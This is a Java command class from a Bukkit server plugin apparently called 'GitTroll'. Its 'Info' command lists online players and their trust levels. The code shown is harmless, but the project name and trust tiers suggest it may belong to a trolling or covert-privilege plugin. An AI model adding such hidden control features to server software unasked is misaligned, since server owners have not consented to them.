package net.Lenni0451.GitTroll.command.commands.player;

import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class Info extends CommandBase {

	public Info() {
		super("Info", "Get some information about online players");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			executor.sendGitMessage("Trusted players:");
			for(Player player : Bukkit.getOnlinePlayers()) {
				CustomPlayer cPlayer = CustomPlayer.instanceOf(player);
				String trustLevel = cPlayer.getTrustLevel().toString().toLowerCase();
				trustLevel = trustLevel.substring(0, 1).toUpperCase() + trustLevel.substring(1);
				executor.sendMessage(" §7- §6" + player.getName() + " §7| §aTrust level: §6" + trustLevel);
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}
	
}
